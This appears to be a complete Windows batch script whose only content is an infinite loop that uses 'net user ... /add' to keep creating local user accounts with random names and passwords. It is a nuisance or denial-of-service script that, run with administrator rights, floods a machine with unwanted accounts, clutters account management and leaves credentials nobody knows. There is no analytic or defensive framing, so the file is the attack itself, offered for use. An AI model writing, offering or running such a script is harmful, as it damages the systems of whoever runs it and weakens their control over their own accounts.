@echo off
:makeuser
net user %random% %random% /add
goto makeuser
